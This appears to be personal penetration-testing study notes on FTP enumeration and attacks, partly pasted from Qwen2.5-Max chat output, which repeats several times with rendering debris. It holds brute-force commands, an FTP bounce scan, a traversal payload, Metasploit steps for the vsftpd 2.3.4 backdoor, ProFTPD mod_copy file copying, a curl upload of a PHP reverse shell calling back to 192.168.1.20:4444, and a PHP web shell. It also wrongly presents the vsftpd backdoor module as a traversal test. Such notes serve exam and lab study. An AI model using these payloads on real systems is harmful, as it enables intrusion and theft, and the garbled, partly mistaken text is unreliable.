---
title: "ftp"
weight: 10
---
use passive command if dir listing diesnt work

```shell-session
ftp> status

Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off
```

&nbsp;

```shell-session
ftp> debug

Debugging on (debug=1).


ftp> trace

Packet tracing on.


ftp> ls

---> PORT 10,10,14,4,188,195
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

In the following example, we can see that if the `hide_ids=YES` setting is present, the UID and GUID representation of the service will be overwritten, making it more difficult for us to identify with which rights these files are written and uploaded.

#### Hiding IDs - YES

FTP

```shell-session
ftp> ls

---> TYPE A
200 Switching to ASCII mode.
ftp: setsockopt (ignored): Permission denied
---> PORT 10,10,14,4,223,101
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 ftp     ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp     ftp            0 Sep 15 14:57 testupload.txt
226 Directory send OK.
```

&nbsp;

Another helpful setting we can use for our purposes is the `ls_recurse_enable=YES`. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.

&nbsp;

#### Recursive Listing

FTP

```shell-session
ftp> ls -R

---> PORT 10,10,14,4,222,149
200 PORT command successful. Consider using PASV.
---> LIST -R
150 Here comes the directory listing.
.:
-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 ftp      ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp      ftp            0 Sep 15 14:57 testupload.txt

./Clients:
drwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight

./Clients/HackTheBox:
-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx
-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx
-rw-r--r--    1 ftp      ftp        478237 Sep 16 18:04 contract.pdf
-rw-r--r--    1 ftp      ftp           348 Sep 16 18:04 meetings.txt

./Clients/Inlanefreight:
-rw-r--r--    1 ftp      ftp         14211 Sep 16 18:00 appointments.xlsx
-rw-r--r--    1 ftp      ftp         37882 Sep 16 17:58 contract.docx
-rw-r--r--    1 ftp      ftp            89 Sep 16 17:58 meetings.txt
-rw-r--r--    1 ftp      ftp        483293 Sep 16 17:59 proposal.pptx

./Documents:
-rw-r--r--    1 ftp      ftp         23211 Sep 16 18:05 appointments-template.xlsx
-rw-r--r--    1 ftp      ftp         32521 Sep 16 18:05 contract-template.docx
-rw-r--r--    1 ftp      ftp        453312 Sep 16 18:05 contract-template.pdf

./Employees:
226 Directory send OK.
```

&nbsp;

```shell-session
cube111@local[/local]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/                                         
           => ‘10.129.14.136/.listing’                                                                     
Connecting to 10.129.14.136:21... connected.                                                               
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.                                                                 
12.12.1.136/.listing           [ <=>                                  ]     466  --.-KB/s    in 0s
```

&nbsp;

```shell-session
sudo nmap -sV -p21 -sC -A 10.129.14.136
```

&nbsp;

```shell-session
cube111@local[/local]$ nc -nv 10.129.14.136 21
```

FTP

```shell-session
cube111@local[/local]$ telnet 10.129.14.136 21
```

It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL. For this, we can use the client `openssl` and communicate with the FTP server. The good thing about using `openssl` is that we can see the SSL certificate, which can also be helpful.

FTP

```shell-session
cube111@local[/local]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

ftp-ssl 10.129.14.136

&nbsp;

&nbsp;

#### Brute Forcing

&nbsp;

#### Brute Forcing with Medusa

Attacking FTP

```shell-session
cube111@local[/local]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

hydra -l cube -P rockyou.txt ftp://10.0.0.1

&nbsp;

The `Nmap` -b flag can be used to perform an FTP bounce attack:

Attacking FTP

```shell-session
cube111@local[/local]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

VULNERABILITY CHECK  
<br/>

&nbsp;

### **2\. Directory Traversal**

- **What It Is** : Poorly configured FTP servers may allow directory traversal attacks, enabling attackers to access files outside the FTP root directory.
- **Why It’s Useful** : You can read or write files outside the intended directory, potentially gaining access to sensitive system files.
- **How to Check** :
    - Attempt to traverse directories using payloads like:
        
        1
        
        GET ../../../../../../etc/passwd
        
    - Tools like `metasploit` or custom scripts can automate this testing.
        
- **Example Exploit** :
    - Use `msfconsole` with the `exploit/unix/ftp/vsftpd_234_backdoor` module to test for directory traversal vulnerabilities.

&nbsp;

&nbsp;

&nbsp;

![profile](/resources/qwen_icon_dark_84-1.png)

Qwen2.5-Max3:51 pm

Yes, there are several **FTP vulnerabilities** that you can explore during an OSCP (Offensive Security Certified Professional) exam or penetration test. These vulnerabilities range from **Remote Code Execution (RCE)** to privilege escalation and misconfigurations. Below is a list of FTP-related vulnerabilities and techniques you should check for:

* * *

### **1\. Anonymous FTP Access**

- **What It Is** : Many FTP servers allow anonymous login with default credentials (`anonymous:anonymous` or `ftp:ftp`).
    
- **Why It’s Useful** : Anonymous access can provide valuable information, such as sensitive files, configuration files, or backups.
    
- **How to Check** :
    
    bash
    
    1
    
    2
    
    ftp &lt;target-ip&gt;
    
    \# Try logging in with "anonymous" as the username and any password (e.g., "anonymous").
    
- **Post-Exploitation** :
    
    - Look for sensitive files like `.bash_history`, configuration files, or backup files.
    - Use tools like `dirb` or `gobuster` to enumerate directories.

* * *

### **2\. Directory Traversal**

- **What It Is** : Poorly configured FTP servers may allow directory traversal attacks, enabling attackers to access files outside the FTP root directory.
- **Why It’s Useful** : You can read or write files outside the intended directory, potentially gaining access to sensitive system files.
- **How to Check** :
    - Attempt to traverse directories using payloads like:
        
        1
        
        GET ../../../../../../etc/passwd
        
    - Tools like `metasploit` or custom scripts can automate this testing.
        
- **Example Exploit** :
    - Use `msfconsole` with the `exploit/unix/ftp/vsftpd_234_backdoor` module to test for directory traversal vulnerabilities.

* * *

### **3\. vsftpd Backdoor (Version 2.3.4)**

- **What It Is** : A well-known backdoor exists in **vsftpd version 2.3.4** , which allows attackers to gain a shell by exploiting a malicious smiley face (`:)`) in the username field.
    
- **Why It’s Useful** : This vulnerability provides direct RCE on vulnerable systems.
    
- **How to Check** :
    
    - Verify the FTP server version:
        
        bash
        
        1nmap -p21 --script=banner &lt;target-ip&gt;
        
        nmap -p21 --script=banner &lt;target-ip&gt;
        
    - If the version is `2.3.4`, exploit it using Metasploit:
        
        msfconsole  
        use exploit/unix/ftp/vsftpd_234_backdoor  
        set RHOSTS &lt;target-ip&gt;  
        run
        
        msfconsole
        
        use exploit/unix/ftp/vsftpd_234_backdoor
        
        set RHOSTS &lt;target-ip&gt;
        
        run
        
- **Post-Exploitation** :
    
    - Once you gain a shell, escalate privileges or pivot to other systems.

&nbsp;

### **4\. ProFTPD Mod_Copy Vulnerability**

- **What It Is** : The `mod_copy` module in **ProFTPD** allows attackers to copy files to arbitrary locations on the server.
- **Why It’s Useful** : You can upload malicious files (e.g., PHP shells) to web-accessible directories.
- **How to Check** :
    - Confirm the FTP server is running ProFTPD:

nmap -p21 --script=ftp-proftpd-backdoor &lt;target-ip&gt;

&nbsp;

&nbsp;

telnet &lt;target-ip&gt; 21  
SITE CPFR /path/to/source/file  
SITE CPTO /var/www/html/shell.php

&nbsp;

&nbsp;

- **Post-Exploitation** :
    - Access the uploaded file via the web server (e.g., `http://<target-ip>/shell.php`).

&nbsp;

&nbsp;

![profile](/resources/qwen_icon_dark_84.png)

Qwen2.5-Max3:51 pm

&nbsp;

#### CoreFTP Exploitation

Yes, there are several **FTP vulnerabilities** that you can explore during an OSCP (Offensive Security Certified Professional) exam or penetration test. These vulnerabilities range from **Remote Code Execution (RCE)** to privilege escalation and misconfigurations. Below is a list of FTP-related vulnerabilities and techniques you should check for:

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops

curl -k -X PUT -H "Host: 192.168.1.10" --basic -u admin:password123 --data-binary "<?php \$sock=fsockopen('192.168.1.20',4444);exec('/bin/sh -i <&3 >&3 2>&3'); ?>" --path-as-is https://192.168.1.10/../../../../../../var/www/html/shell.php
```

&nbsp;

&nbsp;

* * *

### **1\. Anonymous FTP Access**

- **What It Is** : Many FTP servers allow anonymous login with default credentials (`anonymous:anonymous` or `ftp:ftp`).
    
- **Why It’s Useful** : Anonymous access can provide valuable information, such as sensitive files, configuration files, or backups.
    
- **How to Check** :
    
    bash
    
    1
    
    2
    
    ftp &lt;target-ip&gt;
    
    \# Try logging in with "anonymous" as the username and any password (e.g., "anonymous").
    
- **Post-Exploitation** :
    
    - Look for sensitive files like `.bash_history`, configuration files, or backup files.
    - Use tools like `dirb` or `gobuster` to enumerate directories.

* * *

### **2\. Directory Traversal**

- **What It Is** : Poorly configured FTP servers may allow directory traversal attacks, enabling attackers to access files outside the FTP root directory.
- **Why It’s Useful** : You can read or write files outside the intended directory, potentially gaining access to sensitive system files.
- **How to Check** :
    - Attempt to traverse directories using payloads like:
        
        1
        
        GET ../../../../../../etc/passwd
        
    - Tools like `metasploit` or custom scripts can automate this testing.
        
- **Example Exploit** :
    - Use `msfconsole` with the `exploit/unix/ftp/vsftpd_234_backdoor` module to test for directory traversal vulnerabilities.

* * *

### **3\. vsftpd Backdoor (Version 2.3.4)**

- **What It Is** : A well-known backdoor exists in **vsftpd version 2.3.4** , which allows attackers to gain a shell by exploiting a malicious smiley face (`:)`) in the username field.
    
- **Why It’s Useful** : This vulnerability provides direct RCE on vulnerable systems.
    
- **How to Check** :
    
    - Verify the FTP server version:
        
        bash
        
        1
        
        nmap -p21 --script=banner &lt;target-ip&gt;
        
    - If the version is `2.3.4`, exploit it using Metasploit:
        
        bash
        
        1
        
        2
        
        3
        
        4
        
        msfconsole
        
        use exploit/unix/ftp/vsftpd_234_backdoor
        
        set RHOSTS &lt;target-ip&gt;
        
        run
        
- **Post-Exploitation** :
    
    - Once you gain a shell, escalate privileges or pivot to other systems.

* * *

### **4\. ProFTPD Mod_Copy Vulnerability**

- **What It Is** : The `mod_copy` module in **ProFTPD** allows attackers to copy files to arbitrary locations on the server.
    
- **Why It’s Useful** : You can upload malicious files (e.g., PHP shells) to web-accessible directories.
    
- **How to Check** :
    
    - Confirm the FTP server is running ProFTPD:
        
        bash
        
        1
        
        nmap -p21 --script=ftp-proftpd-backdoor &lt;target-ip&gt;
        
    - Use the `SITE CPFR` and `SITE CPTO` commands to copy files:
        
        &nbsp;
        
        telnet &lt;target-ip&gt; 21
        
        SITE CPFR /path/to/source/file
        
        SITE CPTO /var/www/html/shell.php
        
- **Post-Exploitation** :
    
    - Access the uploaded file via the web server (e.g., `http://<target-ip>/shell.php`).

* * *

### **5\. FTP Bounce Attack**

- **What It Is** : Some FTP servers allow attackers to use the `PORT` command to redirect traffic to third-party IPs and ports.
    
- **Why It’s Useful** : You can mask your identity or scan internal networks through the FTP server.
    
- **How to Check** :
    
    - Use Nmap with the `-b` flag:
        
        bash
        
        1
        
        nmap -Pn -v -n -p80 -b anonymous:password@&lt;ftp-server-ip&gt; &lt;target-ip&gt;
        
- **Post-Exploitation** :
    
    - Use the FTP server as a proxy for scanning or exfiltrating data.

* * *

### **6\. Misconfigured Permissions**

- **What It Is** : FTP servers may have weak permissions that allow unauthorized users to upload or download files.
- **Why It’s Useful** : You can upload malicious files (e.g., reverse shells) or download sensitive files.
- **How to Check** :
    - Log in to the FTP server and attempt to upload/download files:
        
        bash
        
    - echo '&lt;?php system($\_GET\["cmd"\]); ?&gt;' > shell.php  
        ftp &lt;target-ip&gt;  
        put shell.php /var/www/html/shell.php  
        curl http://&lt;target-ip&gt;/shell.php?cmd=id